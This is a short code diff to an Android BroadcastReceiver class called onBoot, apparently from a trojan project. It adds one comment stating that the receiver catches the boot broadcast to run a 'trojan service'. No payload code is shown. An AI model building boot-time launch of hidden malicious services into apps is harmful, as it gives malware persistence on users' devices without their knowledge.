@@ -6,6 +6,7 @@ import android.content.Intent;
 
 /**
  * Created by doctorrabb on 16.07.16.
+ * Receive android boot action and run trojan service
  */
 public class onBoot extends BroadcastReceiver {
     @Override
